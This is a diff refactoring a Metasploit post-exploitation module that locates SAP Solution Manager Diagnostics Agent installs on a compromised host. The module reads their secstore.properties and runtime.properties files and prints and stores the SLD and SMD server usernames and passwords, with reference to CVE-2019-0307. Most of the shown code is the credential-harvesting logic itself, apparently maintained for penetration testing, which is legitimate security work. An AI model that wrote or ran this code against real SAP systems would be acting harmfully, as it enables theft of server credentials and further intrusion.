@@ -24,8 +24,8 @@ class MetasploitModule < Msf::Post
         info,
         'Name' => 'Diagnostics Agent in Solution Manager, stores unencrypted credentials for Solution Manager server',
         'Description' => %q{
-          If a SMDAgent has CVE-2019-0307 vulnerability, attackers can obtain its secstore.properties configuration file,
-          which contains the credentials for the SAP Solution Manager server to which this SMDAgent is connected.
+          This module retrieves the `secstore.properties` file on a SMDAgent. This file contains the credentials
+          used by the SMDAgent to connect to the SAP Solution Manager server.
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -52,13 +52,13 @@ class MetasploitModule < Msf::Post
     case session.platform
     when 'windows'
       windows = true
-      instances = list_dir(WIN_PREFIX, windows, meterpreter)
+      instances = dir(WIN_PREFIX)
     else
       windows = false
-      instances = list_dir(UNIX_PREFIX, windows, meterpreter)
+      instances = dir(UNIX_PREFIX)
     end
 
-    if (instances == '') || instances.nil? || instances.empty?
+    if instances.nil? || instances.empty?
       fail_with(Failure::NotFound, 'SAP root directory not found')
     end
 
@@ -79,8 +79,8 @@ class MetasploitModule < Msf::Post
         secstore_properties_file_name = "#{UNIX_PREFIX}#{instance}#{UNIX_SUFFIX}#{SECSTORE_FILE}"
       end
 
-      runtime_properties = parse_properties_file(runtime_properties_file_name, windows, meterpreter)
-      secstore_properties = parse_properties_file(secstore_properties_file_name, windows, meterpreter)
+      runtime_properties = parse_properties_file(runtime_properties_file_name, meterpreter)
+      secstore_properties = parse_properties_file(secstore_properties_file_name, meterpreter)
 
       next if runtime_properties.empty?
 
@@ -102,7 +102,7 @@ class MetasploitModule < Msf::Post
 
       # Parse runtime.properties file
       runtime_properties.each do |property|
-        if property[:name] =~ /sld\./
+        if property[:name].include?('sld.')
           case property[:name]
           when /hostprotocol/
             sld_protocol = property[:value]
@@ -111,7 +111,7 @@ class MetasploitModule < Msf::Post
           when /hostport/
             sld_port = property[:value]
           end
-        elsif property[:name] =~ /smd\./
+        elsif property[:name].include?('smd.')
           case property[:name]
           when /url/
             smd_url = property[:value].gsub(/\\:/, ':')
@@ -121,14 +121,14 @@ class MetasploitModule < Msf::Post
 
       # Parse secstore.properties file
       secstore_properties.each do |property|
-        if property[:name] =~ %r{sld/}
+        if property[:name].include?('sld/')
           case property[:name]
           when /usr/
             sld_username = property[:value]
           when /pwd/
             sld_password = property[:value]
           end
-        elsif property[:name] =~ %r{smd/}
+        elsif property[:name].include?('smd/')
           case property[:name]
           when /User/
             smd_username = property[:value]
@@ -142,7 +142,7 @@ class MetasploitModule < Msf::Post
       if !sld_protocol.nil? || !sld_hostname.nil? || !sld_port.nil? || !sld_username.nil? || !sld_password.nil?
         print_line
         print_status('SLD properties:')
-        unless sld_protocol.nil? then print_status("SLD protocol: #{sld_protocol}") end
+        print_status("SLD protocol: #{sld_protocol}") unless sld_protocol.nil?
         unless sld_hostname.nil?
           print_status("SLD hostname: #{sld_hostname}")
           if meterpreter
@@ -158,18 +158,18 @@ class MetasploitModule < Msf::Post
             end
           end
         end
-        unless sld_port.nil? then print_status("SLD port: #{sld_port}") end
-        unless sld_username.nil? then print_good("SLD username: #{sld_username}") end
-        unless sld_password.nil? then print_good("SLD password: #{sld_password}") end
+        print_status("SLD port: #{sld_port}") unless sld_port.nil?
+        print_good("SLD username: #{sld_username}") unless sld_username.nil?
+        print_good("SLD password: #{sld_password}") unless sld_password.nil?
       end
 
       # Print SMD properties
       if !smd_url.nil? || !smd_username.nil? || !smd_password.nil?
         print_line
         print_status('SMD properties:')
-        unless smd_url.nil? then print_status("SMD url: #{smd_url}") end
-        unless smd_username.nil? then print_good("SMD username: #{smd_username}") end
-        unless smd_password.nil? then print_good("SMD password: #{smd_password}") end
+        print_status("SMD url: #{smd_url}") unless smd_url.nil?
+        print_good("SMD username: #{smd_username}") unless smd_username.nil?
+        print_good("SMD password: #{smd_password}") unless smd_password.nil?
       end
 
       # Store decoded credentials, report service and vuln
@@ -219,57 +219,10 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def list_dir(directory, is_windows, is_meterpreter)
-    if is_meterpreter
-      directories = session.fs.dir.foreach(directory).to_a
-    else
-      if is_windows
-        command = "dir #{directory}"
-      else
-        command = "ls #{directory}"
-      end
-      directories = session.shell_command(command).split("\n")
-    end
-    directories
-  end
-
-  def read_file(filename, is_windows, is_meterpreter)
-    if is_meterpreter
-      file_content = session.fs.file.open(filename).read
-    else
-      if is_windows
-        command = "more #{filename}"
-      else
-        command = "cat #{filename}"
-      end
-      file_content = session.shell_command(command)
-    end
-    file_content
-  end
-
-  def file_exist(filename, is_windows, is_meterpreter)
-    if is_meterpreter
-      exist = session.fs.file.exist?(filename)
-    else
-      if is_windows
-        command = "more #{filename}"
-      else
-        command = "stat #{filename}"
-      end
-      stat = session.shell_command(command)
-      if stat =~ /(no such file|cannot access file)/
-        exist = false
-      else
-        exist = true
-      end
-    end
-    exist
-  end
-
-  def parse_properties_file(filename, is_windows, is_meterpreter)
+  def parse_properties_file(filename, is_meterpreter)
     properties = []
-    if file_exist(filename, is_windows, is_meterpreter)
-      properties_content = read_file(filename, is_windows, is_meterpreter)
+    if file_exist?(filename)
+      properties_content = read_file(filename)
       if properties_content.nil?
         print_error("Failed to read properties file: #{filename}")
       else
